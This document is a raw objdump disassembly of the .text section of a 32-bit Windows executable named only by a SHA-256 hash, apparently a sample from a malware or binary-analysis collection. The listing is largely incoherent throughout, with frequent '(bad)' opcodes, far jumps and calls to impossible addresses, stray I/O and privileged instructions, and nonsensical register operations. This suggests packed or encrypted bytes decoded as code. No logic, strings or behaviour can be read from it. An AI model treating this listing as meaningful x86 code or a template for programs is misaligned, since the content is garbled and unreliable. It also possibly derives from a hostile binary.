
17bc737eb583235f431a00225bb87b268732bf47e845a8b246ede6f4b876f228.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	call   0x8d6880
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],al
  40100d:	add    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ebp+0x0],cl
  401012:	add    BYTE PTR [eax],al
  401014:	add    al,ah
  401016:	add    BYTE PTR [eax],al
  401018:	add    BYTE PTR [esi+0x554d0000],ah
  40101e:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  401024:	mov    esp,ebp
  401026:	or     ah,dh
  401028:	dec    ebp
  401029:	add    bh,al
  40102b:	add    BYTE PTR [eax],cl
  40102d:	add    BYTE PTR [eax],al
  40102f:	mov    DWORD PTR [eax],0x40f44545
  401035:	cmp    BYTE PTR [eax],al
  401037:	test   DWORD PTR [ebx-0x34070b64],ecx
  40103d:	(bad)  
  40103e:	enter  0x4d45,0xbc
  401042:	mov    edi,DWORD PTR [ebx]
  401044:	hlt    
  401045:	test   ebx,ecx
  401047:	pushf  
  401048:	enter  0x4df8,0x8b
  40104c:	mov    DWORD PTR [ebp-0x20],0x890208
  401053:	inc    ebp
  401054:	inc    ebp
  401055:	cld    
  401056:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40105c:	or     BYTE PTR [ebx+0x0],dl
  40105f:	mov    ebx,0x8bd5900
  401064:	call   DWORD PTR [ecx-0x1]
  401067:	pop    es
  401068:	mov    ch,0x33
  40106a:	dec    ebx
  40106c:	(bad)  
  40106d:	mov    eax,0x72009fa4
  401072:	push   DWORD PTR [edx]
  401074:	or     BYTE PTR [eax],al
  401076:	jmp    0xff89:0x75c84d03
  40107d:	dec    ebp
  40107e:	loopne 0x401050
  401080:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  401086:	add    BYTE PTR [ebx],dh
  401088:	mov    ecx,ebx
  40108a:	hlt    
  40108b:	add    ecx,ebx
  40108d:	enter  0x899f,0x32
  401091:	dec    ebp
  401092:	add    ecx,eax
  401094:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40109a:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4010a1:	xor    ecx,ebx
  4010a3:	retf   
  4010a4:	enter  0x4d03,0xc8
  4010a8:	mov    DWORD PTR fs:[eax],ebx
  4010ab:	lea    eax,[eax]
  4010ad:	push   esp
  4010ae:	mov    edi,edi
  4010b0:	fs (bad) 
  4010b2:	(bad)  
  4010b3:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4010b9:	push   0xffffffff
  4010bb:	and    bh,bh
  4010bd:	pop    ecx
  4010be:	inc    eax
  4010bf:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4010c5:	push   0xffffff8b
  4010c7:	pop    ecx
  4010c8:	cld    
  4010c9:	dec    ebp
  4010ca:	lea    ecx,[ecx+0x45ff08ff]
  4010d0:	mov    BYTE PTR [edx+0x1],cl
  4010d3:	add    BYTE PTR [eax],al
  4010d5:	mov    DWORD PTR [ebp+0x8],0x58008d
  4010dc:	dec    DWORD PTR [ebp-0x77]
  4010df:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4010e6:	cld    
  4010e7:	dec    ebp
  4010e8:	jne    0x40111d
  4010ea:	lea    eax,[ebx]
  4010ec:	push   eax
  4010ed:	mov    edi,edi
  4010ef:	or     BYTE PTR [ecx+0x54a845],cl
  4010f5:	add    al,ch
  4010f7:	(bad)  
  4010f8:	sub    ebp,esp
  4010fa:	add    BYTE PTR [eax],al
  4010fc:	rol    BYTE PTR [eax],0x84
  4010ff:	inc    ebp
  401100:	add    dh,BYTE PTR [esi+0x0]
  401103:	add    BYTE PTR [ebp-0x73],al
  401106:	mov    ebp,DWORD PTR [esp+edx*4]
  401109:	inc    DWORD PTR [eax]
  40110b:	lea    ecx,[ebx-0x30074f4]
  401111:	call   0x411c96
  401116:	add    BYTE PTR [ebp+0x0],cl
  401119:	jne    0x40115c
  40111b:	dec    DWORD PTR [ebx-0x76210314]
  401121:	dec    ebp
  401122:	add    DWORD PTR [ebp+0x0],esi
  401125:	(bad)  
  401126:	xchg   ebp,eax
  401127:	loopne 0x401128
  401129:	inc    eax
  40112a:	inc    DWORD PTR [eax]
  40112c:	mov    ecx,DWORD PTR [ebp-0x4]
  40112f:	xor    edx,DWORD PTR [edx+0x7201b8]
  401135:	add    BYTE PTR [edx],dl
  401137:	enter  0x4d90,0x0
  40113b:	mov    eax,DWORD PTR [eax]
  40113d:	hlt    
  40113e:	add    al,0xa5
  401140:	mov    al,0xff
  401142:	add    bh,bh
  401144:	add    BYTE PTR [ebx],dh
  401146:	inc    DWORD PTR [ebx]
  401148:	sbb    al,0x89
  40114a:	jne    0x401124
  40114c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  401152:	mov    eax,DWORD PTR [ebp-0xff0048]
  401158:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40115f:	inc    DWORD PTR [ebp-0x75]
  401162:	fisttp QWORD PTR [esi+ebp*8]
  401165:	test   DWORD PTR [esi-0x1],esp
  401168:	inc    ebp
  401169:	(bad)  
  40116a:	aas    
  40116b:	inc    ebp
  40116c:	(bad)  
  40116d:	lea    edi,[esp+eiz*2-0x1]
  401171:	push   DWORD PTR [edi]
  401173:	mov    DWORD PTR ds:0x8000c7a0,edi
  401179:	mov    ebp,esp
  40117b:	cld    
  40117c:	jmp    0xdfff:0xeeff458d
  401183:	mov    bh,al
  401185:	add    DWORD PTR [eax-0x13ba1500],ecx
  40118b:	inc    DWORD PTR [ebp-0x4]
  40118e:	xlat   BYTE PTR ds:[ebx]
  40118f:	lea    edi,[edi]
  401191:	inc    edi
  401193:	jmp    FWORD PTR [eax-0x78]
  401196:	inc    DWORD PTR [ecx]
  401198:	aaa    
  401199:	add    BYTE PTR ds:0x6c00c757,bh
  40119f:	test   edi,edi
  4011a1:	pandn  mm0,mm5
  4011a4:	aas    
  4011a5:	add    bh,al
  4011a7:	mov    esi,DWORD PTR [eax-0x4]
  4011aa:	inc    DWORD PTR [eax+0xdf01ee]
  4011b0:	(bad)  
  4011b1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4011b5:	mov    esp,ebx
  4011b7:	xchg   esp,eax
  4011b8:	rol    DWORD PTR [eax],cl
  4011ba:	(bad)  
  4011bb:	mov    edi,DWORD PTR [eax+0x3]
  4011be:	(bad)  
  4011bf:	cmp    al,0xd7
  4011c1:	dec    ebp
  4011c2:	ror    DWORD PTR [ebx+0x2ad8e8],0x0
  4011c9:	lea    ecx,[ebx-0x7f0003b4]
  4011cf:	push   edx
  4011d0:	add    DWORD PTR [ebp+0x0],edx
  4011d3:	mov    esi,DWORD PTR [eax]
  4011d5:	mov    WORD PTR [edx+0x0],gs
  4011d8:	add    BYTE PTR [ebx-0x778afc7b],cl
  4011de:	mov    eax,DWORD PTR [eax]
  4011e0:	cld    
  4011e1:	push   0x7d
  4011e3:	dec    DWORD PTR [ebx+0xd88c]
  4011e9:	push   edx
  4011ea:	mov    edx,DWORD PTR [ecx-0x4]
  4011ed:	call   DWORD PTR [eax+0x7d01fc]
  4011f3:	mov    ecx,DWORD PTR [ecx+0x509000fc]
  4011f9:	add    DWORD PTR [esi+0x0],edx
  4011fc:	test   DWORD PTR [ebp+0x75],eax
  4011ff:	jmp    0x947d:0xc7fce28b
  401206:	mov    ebp,ebx
  401208:	fcom   st(7)
  40120a:	add    bh,al
  40120c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  401212:	add    edi,edi
  401214:	add    bh,bh
  401216:	addr16 in eax,dx
  401218:	add    dh,dl
  40121a:	push   eax
  40121b:	inc    ebp
  40121c:	push   esi
  40121d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  401223:	test   BYTE PTR [ebx],dh
  401225:	(bad)  
  401226:	add    eax,0x4572c8
  40122b:	jecxz  0x4011ee
  40122d:	rol    DWORD PTR [edi+eax*8-0x22ff73ff],cl
  401234:	inc    esi
  401235:	jle    0x401237
  401237:	test   edi,eax
  401239:	jmp    esp
  40123b:	inc    DWORD PTR [eax]
  40123d:	in     eax,dx
  40123e:	add    dh,dl
  401240:	jne    0x4011c7
  401242:	mov    edi,edi
  401244:	cld    
  401245:	inc    DWORD PTR [ebp-0x14]
  401248:	mov    ebp,edx
  40124a:	mov    ah,0x85
  40124c:	add    bh,bh
  40124e:	call   0x1163d52
  401253:	enter  0x858b,0xfc
  401257:	inc    DWORD PTR [eax+0xeb01ff]
  40125d:	in     al,dx
  40125e:	xor    BYTE PTR [ebp-0xff0020],al
  401264:	mov    ebx,ebp
  401266:	cld    
  401267:	jle    0x4011f2
  401269:	mov    eax,0x50000001
  40126e:	add    DWORD PTR [ebp+0x45],eax
  401271:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  401277:	dec    DWORD PTR [ebx-0x3fd80318]
  40127d:	add    BYTE PTR [ebp-0xbf0040],dl
  401283:	inc    ebp
  401284:	das    
  401285:	mov    eax,DWORD PTR [eax]
  401287:	cld    
  401288:	push   eax
  401289:	mov    al,0x45
  40128b:	add    DWORD PTR [ebx+0x459c00],ecx
  401291:	mov    edi,edi
  401293:	mov    eax,0xe80800ff
  401298:	inc    ebp
  401299:	sub    cl,BYTE PTR [ebx-0x47000400]
  40129f:	add    al,0x1
  4012a1:	rol    BYTE PTR [eax],0x1e
  4012a4:	jne    0x4012eb
  4012a6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4012ac:	inc    DWORD PTR [ecx]
  4012ae:	call   0x853cb3
  4012b3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4012b9:	call   0x403cbf
  4012be:	xor    bh,bh
  4012c0:	push   edi
  4012c1:	adc    BYTE PTR [ebx-0x747423bb],al
  4012c7:	loopne 0x4012a5
  4012c9:	ret    
  4012ca:	loopne 0x40126b
  4012cc:	xor    DWORD PTR [edx],0x31
  4012cf:	cmp    edi,edi
  4012d1:	bswap  esp
  4012d3:	rol    BYTE PTR gs:[eax],0x5
  4012d7:	jmp    0x12b1421
  4012dc:	mov    eax,DWORD PTR [ebp-0x4]
  4012df:	add    BYTE PTR [eax+0xff0100],bh
  4012e5:	cld    
  4012e6:	jne    0x401365
  4012e8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4012ee:	lds    eax,FWORD PTR [ecx]
  4012f0:	add    BYTE PTR [eax],al
  4012f2:	push   eax
  4012f3:	cs inc ebp
  4012f5:	add    BYTE PTR [ebx+0x459850],cl
  4012fb:	mov    edi,edi
  4012fd:	test   al,0xff
  4012ff:	add    BYTE PTR [eax],cl
  401301:	inc    DWORD PTR [ebp-0x18]
  401304:	jmp    DWORD PTR [esi]
  401306:	fadd   QWORD PTR [eax]
  401308:	jge    0x401357
  40130a:	adc    BYTE PTR [ebx+0x459cb9],cl
  401310:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  401316:	lahf   
  401317:	mov    eax,0x30132
  40131c:	lea    esi,[ebp+0x2c]
  40131f:	xor    edi,edi
  401321:	(bad)  
  401322:	call   0x13f3c8f
  401327:	call   0x1343db7
  40132c:	jne    0x4012b9
  40132e:	xor    edi,esp
  401330:	add    eax,DWORD PTR [eax+0xc018d]
  401336:	push   DWORD PTR [eax]
  401338:	call   0xc93c94
  40133d:	int3   
  40133e:	inc    DWORD PTR [ebp-0x14]
  401341:	mov    ecx,DWORD PTR [ebp-0x28]
  401344:	xor    eax,DWORD PTR [eax]
  401346:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40134c:	(bad)  
  40134d:	xchg   ebp,eax
  40134e:	in     al,0xff
  401350:	add    bh,bh
  401352:	add    BYTE PTR [eax*2+0x8508b00],al
  401359:	inc    ebp
  40135a:	ret    
  40135b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff61]
  401362:	mov    edi,edi
  401364:	or     BYTE PTR [eax],cl
  401366:	inc    ebp
  401367:	test   DWORD PTR gs:[eax],eax
  40136a:	je     0x4013b1
  40136c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  401372:	xor    edx,DWORD PTR [eax-0x73]
  401375:	push   ebp
  401376:	or     BYTE PTR [ebp+0x21007572],al
  40137c:	inc    ebp
  40137d:	in     al,dx
  40137e:	mov    ebp,DWORD PTR [eax]
  401380:	mov    esp,0x618bc345
  401385:	fmul   st,st(5)
  401387:	add    BYTE PTR [ebx],ch
  401389:	mov    eax,DWORD PTR [ebx]
  40138b:	cld    
  40138c:	loopne 0x40134e
  40138e:	inc    ebp
  40138f:	push   ebp
  401390:	cmp    ebp,eax
  401392:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  401399:	cld    
  40139a:	fadd   DWORD PTR [eax+0x3b014d]
  4013a0:	jne    0x4013d2
  4013a2:	push   0xf8898557
  4013a7:	in     al,dx
  4013a8:	jne    0x4013ef
  4013aa:	lea    eax,[ebx+0x72e8dcc8]
  4013b0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4013b6:	jmp    0x4013eb
  4013b8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4013be:	xor    eax,edi
  4013c0:	adc    DWORD PTR [ebp-0xcd0061],0x8b9031
  4013ca:	rcl    BYTE PTR [eax-0x40],1
  4013cd:	inc    ebp
  4013ce:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4013d6:	inc    ebp
  4013d7:	xchg   ebp,eax
  4013d8:	ud0    ebp,DWORD PTR [ebx]
  4013db:	inc    DWORD PTR [eax]
  4013dd:	jp     0x401455
  4013df:	add    BYTE PTR [edx+0x1f558050],cl
  4013e5:	mov    ecx,DWORD PTR [esp+esi*8]
  4013e8:	inc    eax
  4013e9:	retf   
  4013ea:	inc    ebp
  4013eb:	iret   
  4013ec:	jb     0x4013b6
  4013ee:	mov    eax,DWORD PTR [edi]
  4013f0:	enter  0x4545,0x1
  4013f4:	cmp    BYTE PTR [eax],al
  4013f6:	pushf  
  4013f7:	mov    ecx,DWORD PTR [ecx+0x3b4df0bc]
  4013fd:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  401404:	dec    ebp
  401405:	add    BYTE PTR [ebx],dh
  401407:	inc    ebp
  401408:	mov    DWORD PTR [ebx-0x3f601b4c],ecx
  40140e:	xor    dl,BYTE PTR [edx]
  401410:	add    eax,DWORD PTR [ebp-0x77]
  401413:	mov    eax,esp
  401415:	fmul   DWORD PTR [ebp-0x3d]
  401418:	xor    eax,DWORD PTR [ebx+eax*1+0x832899f]
  40141f:	mov    DWORD PTR [ebp-0x28],eax
  401422:	fadd   DWORD PTR [ebp-0x64]
  401425:	xor    eax,edi
  401427:	mov    ecx,0xff858db0
  40142c:	clc    
  40142d:	enter  0x4d45,0x3d
  401431:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  401438:	test   esi,edi
  40143a:	clc    
  40143b:	inc    DWORD PTR [ebp+0x45]
  40143e:	aas    
  40143f:	mov    ebx,DWORD PTR [eax+ecx*1+0x16a8c8c7]
  401446:	test   DWORD PTR [eax],edi
  401448:	clc    
  401449:	pushf  
  40144a:	inc    ebp
  40144b:	push   DWORD PTR [ecx]
  40144d:	cld    
  40144e:	pushf  
  40144f:	inc    ebp
  401450:	mov    edx,DWORD PTR [eax-0x28]
  401453:	ins    DWORD PTR es:[edi],dx
  401454:	push   ebp
  401455:	add    BYTE PTR [ebx],dh
  401457:	mov    DWORD PTR [ebx],eax
  401459:	sar    BYTE PTR [ebx],1
  40145b:	adc    BYTE PTR [edi],cl
  40145d:	dec    ebp
  40145e:	adc    al,0x8b
  401460:	add    al,dl
  401462:	jmp    0x1011632
  401467:	jb     0x4014b6
  401469:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40146f:	xor    ecx,DWORD PTR [ebp+0x3b]
  401472:	xor    ecx,DWORD PTR [edi]
  401474:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  401478:	(bad)  
  40147a:	clc    
  40147b:	enter  0x8400,0x8b
  40147f:	pop    es
  401480:	mov    al,0x0
  401482:	push   ebp
  401483:	push   cs
  401484:	xor    ecx,eax
  401486:	xor    esp,ecx
  401488:	add    ebp,DWORD PTR [eax]
  40148a:	add    esi,DWORD PTR [eax]
  40148c:	(bad)  
  40148e:	retf   0x55c8
  401491:	repnz mov eax,DWORD PTR [ebp-0x10]
  401495:	(bad)  
  401496:	cli    
  401497:	fdivr  st,st(1)
  401499:	test   DWORD PTR [eax+edi*8],ecx
  40149c:	dec    ebp
  40149d:	inc    ebp
  40149e:	xor    edi,DWORD PTR [eax-0x7167afd]
  4014a4:	add    BYTE PTR [ebp+0x0],al
  4014a7:	mov    ecx,DWORD PTR [ebp-0x28]
  4014aa:	mov    ecx,ebx
  4014ac:	clc    
  4014ad:	jne    0x40147a
  4014af:	mov    esi,0xd672d3
  4014b4:	into   
  4014b5:	into   
  4014b6:	scas   eax,DWORD PTR es:[edi]
  4014b7:	dec    ebp
  4014b8:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4014be:	sub    ecx,esi
  4014c0:	cmp    ecx,DWORD PTR [ebp+0x77]
  4014c3:	(bad)  
  4014c4:	mov    edi,eax
  4014c6:	mov    al,0x85
  4014c8:	mov    eax,edi
  4014ca:	add    BYTE PTR [ebp-0x75],al
  4014cd:	cmp    ah,BYTE PTR [esp+ebx*4-0x47cc38ab]
  4014d4:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4014da:	(bad)  
  4014dc:	retf   0x559c
  4014df:	(bad)  
  4014e0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4014e7:	inc    ebp
  4014e8:	add    eax,0xeb9c4d3e
  4014ed:	(bad)  
  4014ee:	mov    ecx,esp
  4014f0:	lods   al,BYTE PTR ds:[esi]
  4014f1:	test   DWORD PTR [ebp-0x8],edx
  4014f4:	xor    ecx,DWORD PTR [ebp+0x33]
  4014f7:	mov    eax,DWORD PTR [ebx]
  4014f9:	lock add ecx,ebx
  4014fc:	bswap  esi
  4014fe:	retf   0x55d1
  401501:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  401507:	jmp    0x401502
  401509:	add    BYTE PTR ds:0xebc44d8b,al
  40150f:	push   ebp
  401510:	mov    ebp,DWORD PTR [ebx]
  401512:	test   al,0x8b
  401514:	push   ebp
  401515:	clc    
  401516:	xor    ecx,ebx
  401518:	xor    ecx,esi
  40151a:	add    edx,ecx
  40151c:	add    eax,DWORD PTR [edx+0xca010f]
  401522:	push   ebp
  401523:	dec    ebp
  401524:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40152a:	stc    
  40152b:	rol    DWORD PTR ds:0xebce4dd6,cl
  401531:	scas   eax,DWORD PTR es:[edi]
  401532:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  401538:	xor    ebp,DWORD PTR [ebx]
  40153a:	xor    edi,DWORD PTR [ebx]
  40153c:	add    esi,DWORD PTR [edi+0x3]
  40153f:	mov    ecx,DWORD PTR [edi]
  401541:	clc    
  401542:	retf   0x55cb
  401545:	into   
  401546:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40154d:	mov    eax,0x3376554d
  401552:	mov    esi,DWORD PTR [ebx]
  401554:	int3   
  401555:	add    edx,DWORD PTR [ebp+0x3]
  401558:	xor    ecx,DWORD PTR [edi]
  40155a:	xor    ecx,edx
  40155c:	add    edx,DWORD PTR [ebp+0x3]
  40155f:	mov    ecx,DWORD PTR [edi]
  401561:	lock retf 0x4dfa
  401565:	stc    
  401566:	mov    ecx,DWORD PTR [eax]
  401568:	or     BYTE PTR [ebp+0x4d],cl
  40156b:	jmp    0x10415fb
  401570:	dec    ebp
  401571:	dec    ebp
  401572:	(bad)  
  401573:	mov    ebx,esp
  401575:	clc    
  401576:	test   ebx,ecx
  401578:	clc    
  401579:	ror    DWORD PTR [ebp-0x2a],cl
  40157c:	mov    esi,ecx
  40157e:	call   0x3acb5b32
  401583:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40158a:	retf   
  40158b:	ja     0x40155b
  40158d:	mov    ebp,DWORD PTR [eax-0x48]
  401590:	dec    ebp
  401591:	xor    ecx,DWORD PTR [di+0x3]
  401595:	mov    esp,esp
  401597:	clc    
  401598:	push   ebp
  401599:	retf   
  40159a:	mov    dl,bl
  40159c:	adc    esi,edx
  40159e:	jb     0x40156e
  4015a0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4015a6:	call   0x4d6be128
  4015ab:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4015b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015b2:	lahf   
  4015b3:	inc    ebp
  4015b4:	xor    cl,BYTE PTR [ebp-0x78]
  4015b7:	mov    edx,edi
  4015b9:	clc    
  4015ba:	dec    ebp
  4015bb:	retf   
  4015bc:	mov    edx,ebx
  4015be:	call   0x560ee999
  4015c3:	scas   eax,DWORD PTR es:[edi]
  4015c4:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4015ca:	lahf   
  4015cb:	sub    esi,DWORD PTR [edx]
  4015cd:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4015d3:	lods   al,BYTE PTR ds:[esi]
  4015d4:	xor    esp,DWORD PTR [ebx]
  4015d6:	add    ecx,DWORD PTR [ebp-0x1c]
  4015d9:	mov    edi,DWORD PTR [ebp-0x8]
  4015dc:	mov    bl,cl
  4015de:	cmp    dl,bl
  4015e0:	jb     0x4015b0
  4015e2:	add    dh,dl
  4015e4:	dec    ebp
  4015e5:	scas   eax,DWORD PTR es:[edi]
  4015e6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  4015ec:	shr    DWORD PTR [ebx],cl
  4015ee:	into   
  4015ef:	cmp    edx,esi
  4015f1:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  4015f7:	dec    ebp
  4015f8:	dec    ebp
  4015f9:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  4015ff:	retf   
  401600:	xor    edx,esi
  401602:	add    ecx,esi
  401604:	imul   ecx,edx
  401607:	mov    DWORD PTR [ebp+0x8],edx
  40160a:	xor    ecx,DWORD PTR [ebp+0x2b]
  40160d:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  401613:	add    esi,DWORD PTR [ebx]
  401615:	mov    ah,0x3
  401617:	inc    ebp
  401618:	(bad)  
  40161b:	pushf  
  40161c:	jge    0x4015a7
  40161e:	xor    ebx,eax
  401620:	sub    eax,DWORD PTR [ebp-0x73]
  401623:	(bad)  
  401624:	cmp    al,al
  401626:	jb     0x4015ad
  401628:	add    al,bh
  40162a:	ror    DWORD PTR [ebp-0x7a],1
  40162d:	xor    edi,edi
  40162f:	add    edi,edi
  401631:	jmp    0x401680
  401633:	mov    ecx,DWORD PTR [ebx-0x34341324]
  401639:	dec    ebp
  40163a:	into   
  40163b:	mov    ebp,DWORD PTR [edi-0x23737428]
  401641:	lahf   
  401642:	shl    DWORD PTR [edx],cl
  401644:	retf   0x5588
  401647:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40164d:	add    eax,DWORD PTR [eax]
  40164f:	in     al,0x4d
  401651:	push   ebp
  401652:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  401658:	popa   
  401659:	add    ch,cl
  40165b:	dec    ebp
  40165c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  401662:	dec    ebp
  401663:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  401669:	jge    0x401639
  40166b:	mov    BYTE PTR [edi+0xf723b3a],ch
  401671:	add    cl,dh
  401673:	dec    ebp
  401674:	dec    DWORD PTR [ebx-0x2c032375]
  40167a:	adc    BYTE PTR [ebp+0x1],0x8b
  40167e:	add    al,bl
  401680:	jge    0x40160e
  401682:	push   0xffffff9f
  401684:	push   0x8b3032
  401689:	shl    BYTE PTR [ebp+0x55],0x6a
  40168d:	xor    edi,edi
  40168f:	xor    edx,DWORD PTR [ebx+eax*1]
  401692:	inc    ebp
  401693:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  401699:	dec    ebp
  40169a:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4016a0:	jbe    0x40162d
  4016a2:	mov    ebp,esp
  4016a4:	ror    bl,1
  4016a6:	enter  0x14ce,0xaf
  4016aa:	dec    DWORD PTR [ebx-0x2cef17f8]
  4016b0:	push   ebp
  4016b1:	retf   0x5540
  4016b4:	push   ebp
  4016b5:	mov    esi,DWORD PTR [edx-0x1c]
  4016b8:	mov    edx,ebx
  4016ba:	cld    
  4016bb:	(bad)  
  4016bc:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4016c3:	sti    
  4016c4:	add    dh,cl
  4016c6:	push   0xffffff94
  4016c8:	call   FWORD PTR [edi+0x3b5032d0]
  4016ce:	mov    ecx,DWORD PTR [edi]
  4016d0:	int3   
  4016d1:	pop    esi
  4016d2:	inc    ebp
  4016d3:	dec    DWORD PTR [ecx+0x45e8c88b]
  4016d9:	push   ebp
  4016da:	xor    esi,DWORD PTR [ebx]
  4016dc:	mov    DWORD PTR [ebx],0xcace0f9c
  4016e2:	aas    
  4016e3:	push   ebp
  4016e4:	inc    ebp
  4016e5:	xor    eax,esi
  4016e7:	add    eax,esi
  4016e9:	mov    eax,DWORD PTR [ebx]
  4016eb:	(bad)  
  4016ec:	jmp    0x40167a
  4016ee:	mov    bl,BYTE PTR [edi-0x7674cdfb]
  4016f4:	rol    ah,1
  4016f6:	mov    esi,0xf133104d
  4016fb:	mov    edx,0xff348d80
  401700:	mov    dh,0xd1
  401702:	cmp    edx,DWORD PTR [ebp+0xf]
  401705:	mov    eax,DWORD PTR [edx-0x20]
  401708:	add    BYTE PTR [ebp-0x75],bh
  40170b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  401712:	lahf   
  401713:	retf   0x8632
  401716:	cmp    ebp,0x8
  401719:	call   ebx
  40171b:	inc    ebp
  40171c:	inc    ebp
  40171d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  401723:	mov    edi,DWORD PTR [eax]
  401725:	enter  0x49c,0xc7
  401729:	add    al,al
  40172b:	add    bl,al
  40172d:	(bad)  
  40172e:	clc    
  40172f:	enter  0x45,0x38
  401733:	push   eax
  401734:	pushf  
  401735:	mov    edi,eax
  401737:	int3   
  401738:	or     al,al
  40173a:	test   DWORD PTR [edi],edi
  40173c:	clc    
  40173d:	gs inc ebp
  40173f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  401745:	push   ss
  401746:	xor    ecx,DWORD PTR [ebp+0x3]
  401749:	sub    edx,DWORD PTR [ecx-0x76]
  40174c:	dec    ebp
  40174d:	add    DWORD PTR [ebx+0x88d845],ecx
  401753:	mov    esi,DWORD PTR [ebx]
  401755:	or     BYTE PTR [ebx],al
  401757:	cmp    edx,DWORD PTR [ecx-0x38]
  40175a:	dec    ebp
  40175b:	out    dx,eax
  40175c:	xor    eax,DWORD PTR [ebp+0x3]
  40175f:	mov    edx,DWORD PTR [ecx-0x28]
  401762:	dec    ebp
  401763:	add    BYTE PTR [ebx],dh
  401765:	push   0x518003
  40176a:	push   eax
  40176b:	add    BYTE PTR [ebx-0x300748b],cl
  401771:	sbb    BYTE PTR [ebp+0x45],cl
  401774:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40177a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  401780:	dec    ebp
  401781:	inc    ebp
  401782:	xor    eax,esi
  401784:	add    eax,esi
  401786:	push   ecx
  401787:	(bad)  
  401788:	dec    ebp
  401789:	mov    al,ds:0x35e03dff
  40178e:	retf   
  40178f:	(bad)  
  401790:	into   
  401791:	sub    bh,bh
  401793:	dec    esp
  401794:	adc    al,0x9c
  401796:	inc    ebp
  401797:	push   ebp
  401798:	test   DWORD PTR [edi],ecx
  40179a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab5ff80]
  4017a1:	jmp    0xc9b926b5
  4017a6:	add    cl,dl
  4017a8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4017b2:	cmp    cl,BYTE PTR [ebp+0x728b089c]
  4017b8:	rol    BYTE PTR [eax],0x59
  4017bb:	clc    
  4017bc:	popa   
  4017bd:	jb     0x4017c6
  4017bf:	mov    eax,DWORD PTR [ebp-0x30]
  4017c2:	xor    al,0x40
  4017c4:	sub    al,0xc7
  4017c6:	mov    ah,ch
  4017c8:	add    DWORD PTR [ebp+0x4534f845],eax
  4017ce:	sub    al,0x89
  4017d0:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4017d7:	mov    ch,0xff
  4017d9:	clc    
  4017da:	add    DWORD PTR [ebp+0x60],0x3c
  4017de:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  4017e5:	inc    ebp
  4017e6:	dec    DWORD PTR [ebx-0x341ff701]
  4017ec:	test   esi,ecx
  4017ee:	dec    DWORD PTR [ebx-0x7f8a3301]
  4017f4:	push   eax
  4017f5:	add    DWORD PTR [ebp+0x0],eax
  4017f8:	dec    ebx
  4017fa:	or     al,0xce
  4017fc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  401803:	into   
  401804:	add    BYTE PTR [ebx-0x34ff1400],cl
  40180a:	mov    esi,ecx
  40180c:	sar    bh,0x45
  40180f:	adc    al,0x8b
  401811:	clc    
  401812:	fadd   DWORD PTR [ebp+0x0]
  401815:	mov    ebp,DWORD PTR [edx+0x8]
  401818:	push   edi
  401819:	adc    BYTE PTR [eax+0x1],0x83
  40181d:	add    al,al
  40181f:	retf   
  401820:	mov    ecx,esi
  401822:	cld    
  401823:	mov    eax,DWORD PTR [eax+0xcb01cc]
  401829:	into   
